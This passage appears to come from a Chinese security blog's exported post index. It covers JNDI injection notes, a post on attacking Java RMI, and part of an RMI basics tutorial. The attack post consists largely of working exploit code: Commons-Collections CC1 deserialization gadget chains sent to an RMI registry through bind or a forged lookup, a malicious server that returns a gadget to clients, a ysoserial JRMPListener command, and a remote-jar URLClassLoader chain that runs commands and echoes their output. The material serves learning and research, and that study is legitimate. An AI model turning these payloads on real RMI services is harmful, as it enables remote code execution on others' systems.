恶意加载字节码其实是换了一种思路进行字节码的加载，通过 deserializeObject() 方法的反序列化来进行命令执行。\n0x04 小结对于 JNDI 的注入，最重要的是掌握 JNDI 通用注入，也就是 LDAP + Reference 这一个；在掌握了这个之后，理解高版本 jdk 的绕过也相对简单了。\n0x05 参考资料https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6https://www.bilibili.com/video/BV1P54y1Z7Lf?spm_id_from=333.999.0.0https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之RMI专题02-RMI的几种攻击方式","url":"/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","content":"Java反序列化之RMI专题02-RMI的几种攻击方式\n\nJava 反序列化之 RMI 专题 02-RMI 的几种攻击方式0x01 前言续上篇\n0x02 RMI 的基本攻击方式根据 RMI 的部分，有这么一些攻击方式\n\nRMI Client 打 RMI Registry\nRMI Client 打 RMI Server\nRMI Client\n\n1. 攻击 RMI Registry\n只有一种客户端打注册中心\n\n注册中心的交互主要是这一句话\nNaming.bind(\"rmi://127.0.0.1:1099/sayHello\", new RemoteObjImpl());\n\n这里的交互方式不只是只有 bind，还有其他的一系列方式，如下\n我们与注册中心进行交互可以使用如下几种方式：\n\nlist\nbind\nrebind\nunbind\nlookup\n\n这几种方法位于 RegistryImpl_Skel#dispatch 中，如果存在对传入的对象调用 readObject() 方法，则可以利用，dispatch 里面对应关系如下：\n\n0 —– bind\n1 —– list\n2 —– lookup\n3 —– rebind\n4 —– unbind\n\n首先是 list 这种攻击，因为除了 list 和 lookup 两个，其余的交互在 8u121 之后都是需要 localhost 的。但是讲道理，list 的这种攻击比较鸡肋。\n使用 list() 方法进行鸡肋攻击用 list() 方法可以列出目标上所有绑定的对象：\n在 RMIClient 文件夹里面新建一个新的 Java class，因为我们后续的攻击肯定是从用户的客户端出发，往服务端这里打的。代码如下\n// 针对 Registry 的 list 鸡肋攻击  \nimport java.rmi.Naming;  \nimport java.rmi.RemoteException;  \n  \n// 针对 Registry 的 list 鸡肋攻击  \npublic class RegistryListAttack &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        RemoteObj remoteObj = new RemoteObj() &#123;  \n            @Override  \n public String sayHello(String keywords) throws RemoteException &#123;  \n                return null;  \n &#125;  \n        &#125;;  \n String[] s = Naming.list(\"rmi://127.0.0.1:1099\");  \n System.out.println(s);  \n &#125;  \n&#125;\n\n运行的时候，会打印出如下信息\n\n\n因为这里没有 readObject()，所以无法进行反序列化，这样我们的攻击面就太窄了。我们可以跳进 RegistryImpl_Skel#dispatch 看一下，list 对应的是 case1\n\n\n只有 writeObject()，没有 readObject()\nbind 或 rebind 的攻击直接看 bind 方法和 rebind 方法的源码吧\ncase0 是 bind 方法的，case2 是 rebind 方法的。\n\n\n\n\n这两个地方都是有反序列化的，进行反序列化的参数是参数名以及远程对象；这就和我们前面分析的通信原理过程结合起来了。\n所以这个 bind 和 rebind 的服务端，就有概率可以作为反序列化攻击的一个入口类，如果服务端这里存在 CC 链相关的组件漏洞，那么就可以反序列化攻击，这里为了凸显的话，我们先把 CC 链导进来，这里我们就以 CC1 为例。\n&lt;dependencies>  \n &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  \n \t&lt;dependency>  \n \t&lt;groupId>commons-collections&lt;/groupId>  \n\t &lt;artifactId>commons-collections&lt;/artifactId>  \n\t &lt;version>3.2.1&lt;/version>  \n &lt;/dependency>&lt;/dependencies>\n\n逆向分析一下这条链子，原本 CC1 的最后面是 InvocationHandler.readObject()，现在我们要让客户端的 bind() 方法执行 readObject()。\n回过头去看前面的，在客户端收到信息的时候是一个 Proxy 对象，让 Proxy 对象被执行的时候去调 readObject() 方法，可以先点进去 Proxy 对象看一看，其中有一个非常引人注目的方法 ———— newProxyInstance()\n\n\n上面的是传参，下面的是很明显的存在反序列化漏洞的地方，所以我们把 CC1 的那串恶意类拿出来就可以了，让 Proxy 执行 newProxyInstance() 即可，EXP 如下\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.lang.annotation.Target;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Proxy;  \nimport java.rmi.Remote;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class AttackRegistryEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",1099);  \n InvocationHandler handler = (InvocationHandler) CC1();  \n Remote remote = Remote.class.cast(Proxy.newProxyInstance(  \n                Remote.class.getClassLoader(),new Class[] &#123; Remote.class &#125;, handler));  \n registry.bind(\"test\",remote);  \n &#125;  \n  \n    public static Object CC1() throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"value\",\"drunkbaby\");  \n Map&lt;Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n aihConstructor.setAccessible(true);  \n Object o = aihConstructor.newInstance(Target.class, transformedMap);  \n return o;  \n &#125;  \n&#125;\n\nRemote.class.cast 这里实际上是将一个代理对象转换为了 Remote 对象，因为 bind() 方法这里需要传入 Remote 对象。\n\nrebind 的攻击也是如此，将 registry.bind(&quot;test&quot;,remote); 替换为 rebind() 方法即可。\n\nunbind 或 lookup 的攻击先看一下 unbind 和 lookup 的源码部分，可不可以进行反序列化的攻击\n\n\n\n\n因为 unbind 和 lookup 的最终利用和思想都是一样的，这里我们就只拿 lookup 这里来学习。\n大致的思路还是和 bind/rebind 思路是一样的，但是 lookup 这里只可以传入 String 类型，这里我们可以通过伪造 lookup 连接请求进行利用，修改 lookup 方法代码使其可以传入对象。\n我们可以利用反射来实现这种攻击。\nEXP 如下\npublic class AttackRegistryEXP02 &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",1099);  \n InvocationHandler handler = (InvocationHandler) CC1();  \n Remote remote = Remote.class.cast(Proxy.newProxyInstance(  \n                Remote.class.getClassLoader(),new Class[] &#123; Remote.class &#125;, handler));  \n  \n Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  \n fields_0[0].setAccessible(true);  \n UnicastRef ref = (UnicastRef) fields_0[0].get(registry);  \n  \n //获取operations  \n  \n Field[] fields_1 = registry.getClass().getDeclaredFields();  \n fields_1[0].setAccessible(true);  \n Operation[] operations = (Operation[]) fields_1[0].get(registry);  \n  \n // 伪造lookup的代码，去伪造传输信息  \n RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);  \n ObjectOutput var3 = var2.getOutputStream();  \n var3.writeObject(remote);  \n ref.invoke(var2);  \n &#125;  \n    public static Object CC1() throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"value\",\"drunkbaby\");  \n Map&lt;Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n aihConstructor.setAccessible(true);  \n Object o = aihConstructor.newInstance(Target.class, transformedMap);  \n return o;  \n &#125;  \n&#125;\n\n\n\n2. 攻击客户端\n上篇我们分析过，是在 unmarshalValue() 那个地方存在入口类。\n\n注册中心攻击客户端对于注册中心来说，我们还是从这几个方法触发：\n\nbind\nunbind\nrebind\nlist\nlookup\n\n除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，因为 EXP 实在太长了。命令如下：\njava -cp .\\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'calc'\n\n然后使用客户端去访问：\nimport java.rmi.Naming;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n \npublic class Client &#123;\n    public static void main(String[] args) throws RemoteException &#123;\n        Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",1099);\n        registry.list();\n    &#125;\n&#125;\n\n\n\n服务端攻击客户端服务端攻击客户端，大抵可以分为以下两种情景。\n\n服务端返回Object对象\n远程加载对象\n\n服务端返回Object对象在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：\n\nUser接口，返回的是Object对象\n\npublic interface User extends java.rmi.Remote &#123;\n    public Object getUser() throws Exception;\n&#125;\n\n\n服务端实现 User 接口，返回 CC1 的恶意 Object 对象\n\nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.Serializable;  \nimport java.lang.annotation.Retention;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.InvocationTargetException;  \nimport java.lang.reflect.Proxy;  \nimport java.rmi.RemoteException;  \nimport java.rmi.server.UnicastRemoteObject;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class ServerReturnObject extends UnicastRemoteObject implements User  &#123;  \n    public String name;  \n public int age;  \n  \n public ServerReturnObject(String name, int age) throws RemoteException &#123;  \n        super();  \n this.name = name;  \n this.age = age;  \n &#125;  \n  \n    public Object getUser() throws Exception &#123;  \n  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class),  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;,  \n new Object[]&#123;\"getRuntime\",  \n new Class[0]&#125;),  \n new InvokerTransformer(\"invoke\",  \n new Class[]&#123;Object.class, Object[].class&#125;,  \n new Object[]&#123;null, new Object[0]&#125;),  \n new InvokerTransformer(\"exec\",  \n new Class[]&#123;String.class&#125;,  \n new String[]&#123;\"calc.exe\"&#125;),  \n &#125;;  \n Transformer transformerChain = new ChainedTransformer(transformers);  \n Map innerMap = new HashMap();  \n Map outerMap = LazyMap.decorate(innerMap, transformerChain);  \n  \n Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);  \n construct.setAccessible(true);  \n InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);  \n Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, handler);  \n handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);  \n  \n  \n return (Object) handler;  \n &#125;  \n&#125;\n\n\n服务端将恶意对象绑定到注册中心\n\nimport java.rmi.AlreadyBoundException;  \nimport java.rmi.RemoteException;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \npublic class EvilClassServer &#123;  \n    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;  \n        User liming = new ServerReturnObject(\"liming\",15);  \n Registry registry = LocateRegistry.createRegistry(1099);  \n registry.bind(\"user\",liming);  \n  \n System.out.println(\"registry is running...\");  \n  \n System.out.println(\"liming is bind in registry\");  \n &#125;  \n&#125;\n\n\n客户端获取对象并调用 getUser() 方法，将反序列化服务端传来的恶意远程对象。\n\nimport java.rmi.Naming;  \nimport java.rmi.NotBoundException;  \nimport java.rmi.Remote;  \nimport java.rmi.RemoteException;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.registry.Registry;  \n  \n// 服务端打客户端，返回 Object 对象  \npublic class EvilClient &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\",1099);  \n User user = (User)registry.lookup(\"user\");  \n user.getUser();  \n &#125;  \n&#125;\n\n\n\n加载远程对象这个就是 P神 写的那个，codebase 这种。这个可用性还是不咋样，我个人觉得本身这个注册中心，或者是服务端打出来，就没啥意义；再加上利用条件苛刻，就更没劲了。\n当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。\njava.rmi.server.codebase：codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。\nRMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用http://、ftp://、file:&#x2F;&#x2F;进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的java.rmi.server.codebaseURL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的java.rmi.server.codebaseURL去加载对应的类。客户端与服务端两边的java.rmi.server.codebaseURL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：\n\n由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。\n属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。\n\n总的来说利用条件十分苛刻，可用性不强。\n3. 攻击服务端客户端打服务端服务端代码\nimport java.rmi.Naming;  \nimport java.rmi.RemoteException;  \nimport java.rmi.registry.LocateRegistry;  \nimport java.rmi.server.UnicastRemoteObject;  \n  \npublic class VictimServer &#123;  \n    public class RemoteHelloWorld extends UnicastRemoteObject implements RemoteObj &#123;  \n        protected RemoteHelloWorld() throws RemoteException &#123;  \n            super();  \n &#125;  \n  \n        public String hello() throws RemoteException &#123;  \n            System.out.println(\"调用了hello方法\");  \n return \"Hello world\";  \n &#125;  \n  \n        public void evil(Object obj) throws RemoteException &#123;  \n            System.out.println(\"调用了evil方法，传递对象为：\"+obj);  \n &#125;  \n  \n        @Override  \n public String sayHello(String keywords) throws RemoteException &#123;  \n            return null;  \n &#125;  \n    &#125;  \n    private void start() throws Exception &#123;  \n        RemoteHelloWorld h = new RemoteHelloWorld();  \n LocateRegistry.createRegistry(1099);  \n Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h);  \n &#125;  \n  \n    public static void main(String[] args) throws Exception &#123;  \n        new VictimServer().start();  \n &#125;  \n&#125;\n\n\njdk版本1.7\n使用具有漏洞的Commons-Collections3.1组件\nRMI提供的数据有Object类型（因为攻击payload就是Object类型）\n\n这段不是很懂，客户端代码如下\nimport Server.IRemoteHelloWorld;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n \nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.rmi.Naming;\nimport java.util.HashMap;\nimport java.util.Map;\nimport Server.IRemoteHelloWorld;\n \npublic class RMIClient &#123;\n    public static void main(String[] args) throws Exception &#123;\n        IRemoteHelloWorld r = (IRemoteHelloWorld) Naming.lookup(\"rmi://127.0.0.1:1099/Hello\");\n        r.evil(getpayload());\n    &#125;\n \n    public static Object getpayload() throws Exception&#123;\n        Transformer[] transformers = new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;),\n                new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),\n                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)\n        &#125;;\n        Transformer transformerChain = new ChainedTransformer(transformers);\n \n        Map map = new HashMap();\n        map.put(\"value\", \"lala\");\n        Map transformedMap = TransformedMap.decorate(map, null, transformerChain);\n \n        Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);\n        ctor.setAccessible(true);\n        Object instance = ctor.newInstance(Target.class, transformedMap);\n        return instance;\n    &#125;\n \n&#125;\n\n这样的话，不是能够直接调用服务端的类了么，不懂。\n远程加载对象和上边Server打Client一样利用条件非常苛刻。\n参考：https://paper.seebug.org/1091/#serverrmi\n0x03 RMI 进阶攻击方式1. 利用 URLClassLoader实现回显攻击攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端\n远程demo：\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n \npublic class ErrorBaseExec &#123;\n \n    public static void do_exec(String args) throws Exception\n    &#123;\n        Process proc = Runtime.getRuntime().exec(args);\n        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));\n        StringBuffer sb = new StringBuffer();\n        String line;\n        while ((line = br.readLine()) != null)\n        &#123;\n            sb.append(line).append(\"\\n\");\n        &#125;\n        String result = sb.toString();\n        Exception e=new Exception(result);\n        throw e;\n    &#125;\n&#125;\n\n通过如下命令制作成jar包：\njavac ErrorBaseExec.java\njar -cvf RMIexploit.jar ErrorBaseExec.class\n\n客户端POC：\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n \nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n \nimport java.net.URLClassLoader;\n \nimport java.rmi.Remote;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\n \nimport java.util.HashMap;\nimport java.util.Map;\n \n \npublic class Client &#123;\n    public static Constructor&lt;?> getFirstCtor(final String name)\n            throws Exception &#123;\n        final Constructor&lt;?> ctor = Class.forName(name).getDeclaredConstructors()[0];\n        ctor.setAccessible(true);\n \n        return ctor;\n    &#125;\n \n    public static void main(String[] args) throws Exception &#123;\n        String ip = \"127.0.0.1\"; //注册中心ip\n        int port = 1099; //注册中心端口\n        String remotejar = 远程jar;\n        String command = \"whoami\";\n        final String ANN_INV_HANDLER_CLASS = \"sun.reflect.annotation.AnnotationInvocationHandler\";\n \n        try &#123;\n            final Transformer[] transformers = new Transformer[] &#123;\n                    new ConstantTransformer(java.net.URLClassLoader.class),\n                    new InvokerTransformer(\"getConstructor\",\n                            new Class[] &#123; Class[].class &#125;,\n                            new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),\n                    new InvokerTransformer(\"newInstance\",\n                            new Class[] &#123; Object[].class &#125;,\n                            new Object[] &#123;\n                                    new Object[] &#123;\n                                            new java.net.URL[] &#123; new java.net.URL(remotejar) &#125;\n                                    &#125;\n                            &#125;),\n                    new InvokerTransformer(\"loadClass\",\n                            new Class[] &#123; String.class &#125;,\n                            new Object[] &#123; \"ErrorBaseExec\" &#125;),\n                    new InvokerTransformer(\"getMethod\",\n                            new Class[] &#123; String.class, Class[].class &#125;,\n                            new Object[] &#123; \"do_exec\", new Class[] &#123; String.class &#125; &#125;),\n                    new InvokerTransformer(\"invoke\",\n                            new Class[] &#123; Object.class, Object[].class &#125;,\n                            new Object[] &#123; null, new String[] &#123; command &#125; &#125;)\n            &#125;;\n            Transformer transformedChain = new ChainedTransformer(transformers);\n            Map innerMap = new HashMap();\n            innerMap.put(\"value\", \"value\");\n \n            Map outerMap = TransformedMap.decorate(innerMap, null,\n                    transformedChain);\n            Class cl = Class.forName(\n                    \"sun.reflect.annotation.AnnotationInvocationHandler\");\n            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);\n            ctor.setAccessible(true);\n \n            Object instance = ctor.newInstance(Target.class, outerMap);\n            Registry registry = LocateRegistry.getRegistry(ip, port);\n            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)\n                    .newInstance(Target.class,\n                            outerMap);\n            Remote r = Remote.class.cast(Proxy.newProxyInstance(\n                    Remote.class.getClassLoader(),\n                    new Class[] &#123; Remote.class &#125;, h));\n            registry.bind(\"liming\", r);\n        &#125; catch (Exception e) &#123;\n            try &#123;\n                System.out.print(e.getCause().getCause().getCause().getMessage());\n            &#125; catch (Exception ee) &#123;\n                throw e;\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\n\n\n0x03 小结感觉在这块将要淘汰的东西上浪费太久的时间了。醉了\n继续往前。学 jndi\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之RMI专题01-RMI基础","url":"/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/","content":"Java反序列化之RMI专题01-RMI基础\n\nJava 反序列化之 RMI 专题 01-RMI 基础\n环境是 jdk8u65\n本文侧重于理解原理，攻击篇会放到后续一篇中讲。\n\n0x01 前言RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大。本文着重偏向于 RMI 通信原理的理解，如果只懂利用，就太脚本小子了。\n这里有个坑点：就是 RMI 当中的攻击手法只在 jdk8u121 之前才可以进行攻击，因为在 8u121 之后，bind rebind unbind 这三个方法只能对 localhost 进行攻击，后续我们会提到。\n0x02 RMI 基础1. RMI 介绍RMI 全称 Remote Method Invocation（远程方法调用），即在一个 JVM 中 Java 程序调用在另一个远程 JVM 中运行的 Java 程序，这个远程 JVM 既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。\nRMI 依赖的通信协议为 JRMP(Java Remote Message Protocol，Java 远程消息交换协议)，该协议为 Java 定制，要求服务端与客户端都为 Java 编写。\n\n这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范。\n\n\nRMI 包括以下三个部分\n\n\n\n\nServer ———— 服务端：服务端通过绑定远程对象，这个对象可以封装很多网络操作，也就是 SocketClient ———— 客户端：客户端调用服务端的方法\n\n因为有了 C&#x2F;S 的交互，而且 Socket 是对应端口的，这个端口是动态的，所以这里引进了第三个 RMI 的部分 ———— Registry 部分。\n\nRegistry ———— 注册端；提供服务注册与服务获取。即 Server 端向 Registry 注册服务，比如地址、端口等一些信息，Client 端从 Registry 获取远程对象的一些信息，如地址、端口等，然后进行远程调用。\n\n2. RMI 的实现\n这里最好把服务端与客户端拆分成两个工程来做，会更有助于理解。\n\n先来写服务端 ———— Server\n服务端1. 先编写一个远程接口，其中定义了一个 sayHello() 的方法\npublic interface RemoteObj extends Remote &#123;  \n  \n    public String sayHello(String keywords) throws RemoteException;  \n&#125;\n\n此远程接口要求作用域为 public；继承 Remote 接口；让其中的接口方法抛出异常\n2. 定义该接口的实现类 Impl\npublic class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj &#123; \n  \n    public RemoteObjImpl() throws RemoteException &#123;  \n    //    UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出  \n &#125;  \n  \n    @Override  \n public String sayHello(String keywords) throws RemoteException &#123;  \n        String upKeywords = keywords.toUpperCase();  \n System.out.println(upKeywords);  \n return upKeywords;  \n &#125;  \n&#125;\n\n\n实现远程接口\n继承 UnicastRemoteObject 类，用于生成 Stub（存根）和 Skeleton（骨架）。 这个在后续的通信原理当中会讲到 \n构造函数需要抛出一个RemoteException错误\n实现类中使用的对象必须都可序列化，即都继承java.io.Serializable\n\n3. 注册远程对象\npublic class RMIServer &#123;  \n    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException &#123;  \n        // 实例化远程对象  \n RemoteObj remoteObj = new RemoteObjImpl();  \n // 创建注册中心  \n Registry registry = LocateRegistry.createRegistry(1099);  \n // 绑定对象示例到注册中心  \n registry.bind(\"remoteObj\", remoteObj);  \n &#125;  \n&#125;\n\n\nport 默认是 1099，不写会自动补上，其他端口必须写\nbind 的绑定这里，只要和客户端去查找的 registry 一致即可。\n\n如此，服务端就写好了\n\n\n客户端客户端只需从从注册器中获取远程对象，然后调用方法即可。当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。\n所以在客户端这里，也需要定义一个远程对象的接口：\npublic interface RemoteObj extends Remote &#123;  \n  \n    public String sayHello(String keywords) throws RemoteException;  \n&#125;\n\n然后编写客户端的代码，获取远程对象，并调用方法\npublic class RMIClient &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099);  \n RemoteObj remoteObj = (RemoteObj) registry.lookup(\"remoteObj\");  \n remoteObj.sayHello(\"hello\");  \n &#125;  \n&#125;\n\n这样就能够从远端的服务端中调用 RemoteHelloWorld 对象的 sayHello() 方法了。\n0x03 从 Wireshark 抓包分析 RMI 通信原理\n这里文章大部分是引用其他师傅的，我们可以先通过 Wireshark 的抓包心里有个底。\n\n数据端与注册中心（1099 端口）建立通讯\n客户端查询需要调用的函数的远程引用，注册中心返回远程引用和提供该服务的服务端 IP 与端口。\n\n\n\n数据端与注册中心（1099 端口）建立通讯完成后，RMI Server 向远端发送了⼀个 “Call” 消息，远端回复了⼀个 “ReturnData” 消息，然后 RMI Server 端新建了⼀个 TCP 连接，连到远端的 33769 端⼝\n\n\nAC ED 00 05是常见的 Java 反序列化 16 进制特征注意以上两个关键步骤都是使用序列化语句\n客户端新起一个端口与服务端建立 TCP 通讯客户端发送远程引用给服务端，服务端返回函数唯一标识符，来确认可以被调用\n\n\n同样使用序列化的传输形式\n以上两个过程对应的代码是这两句\nRegistry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099);  \nRemoteObj remoteObj = (RemoteObj) registry.lookup(\"remoteObj\"); // 查找远程对象\n\n这里会返回一个 Proxy 类型函数，这个 Proxy 类型函数会在我们后续的攻击中用到。\n客户端序列化传输调用函数的输入参数至服务端\n这一步的同时：服务端返回序列化的执行结果至客户端\n\n\n\n以上调用通讯过程对应的代码是这一句\nremoteObj.sayHello(\"hello\");\n\n可以看出所有的数据流都是使用序列化传输的，那必然在客户端和服务带都存在反序列化的语句。\n总结一下 RMI 的通信原理实际建⽴了两次 TCP 连接，第一次是去连 1099 端口的；第二次是由服务端发送给客户端的。\n在第一次连接当中，是客户端连 Registry 的，在其中寻找 Name 为 hello 的对象，这个对应数据流中的 Call 消息；然后 Registry 返回⼀个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应数据流中的ReturnData消息。\n到了第二次连接，服务端发送给客户端 Call 